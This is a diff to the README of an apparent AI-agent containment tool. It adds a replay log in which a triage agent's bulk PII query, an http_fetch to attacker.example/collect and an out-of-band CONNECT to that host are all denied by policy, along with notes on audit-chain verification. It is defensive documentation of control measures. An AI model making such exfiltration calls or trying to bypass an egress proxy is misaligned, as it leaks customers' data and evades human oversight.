@@ -22,20 +22,45 @@ rule stops it.
 ./scripts/demo.sh guarded       # identical agent code; every step denied
 ```
 
+`warden replay 4711` prints exactly this — it is copied from a run against a
+real OPA server and the real policy bundle, not written by hand:
+
 ```
 task 4711  purpose=support-triage  agent=triage-bot
-  ✓ read_document(ticket-4711)              allow  tools.allowed
-  ✓ read_document(kb/refund-policy)         allow  tools.allowed
-  ✓ query_customers(rows≈1)                 allow  rows.bounded
+  ✓ read_document(ticket-4711)             allow  allow
+  ✓ read_document(kb/refund-policy)        allow  allow
+  ✓ query_customers(rows≈1)                allow  allow
       ⛔ TAINT: task now holds data_class=pii
-  ✗ query_customers(rows≈10312)             DENY   rows.bounded
-  ✗ http_fetch(attacker.example/collect)    DENY   egress.allowlist
-  ✗ http_fetch(docstore.internal/feedback)  DENY   egress.pii_sink
-  ✓ send_email()                            allow  mail.counterparty
-  chain intact: 7 records, head sha256:41ab…
+  ✗ query_customers(rows≈10312)            DENY   rows.bounded
+  ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
+  ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
+  ✓ send_email(customer:8812)              allow  allow
+  chain intact: 7 records, head sha256:de6d8b7d…
 ```
 
-The last line matters as much as the denials: **the task still completed.**
+An allow carries the rule `allow`, not the name of a rule that didn't fire:
+`deny_reasons` is the source of truth and there was nothing in it. Naming a
+rule on the allow lines would claim the log knows *why* a call was permitted,
+which it does not — it knows only that no rule objected.
+
+The last line matters as much as the denials, twice over: **the task still
+completed**, and the chain claim is now the result of an actual
+`verify_chain()` rather than a line printed unconditionally. A tampered log
+renders as `⚠ CHAIN BROKEN at seq N`.
+
+Out-of-band bypass attempts are recorded by the proxy, not the tool API, and
+they carry no token — so they are attributed to the sentinel principal and
+appear under `warden replay -`:
+
+```
+task -  purpose=-  agent=unauthenticated
+  ✗ CONNECT(attacker.example)              DENY   unauthenticated
+```
+
+`unauthenticated`, not `egress.allowlist`: nothing on `agent-net` holds a
+token to present to the proxy, so the attempt is refused before any policy
+question is asked. That is the stronger record — the bypass carried no
+authority at all.
 
 ## How containment works
 
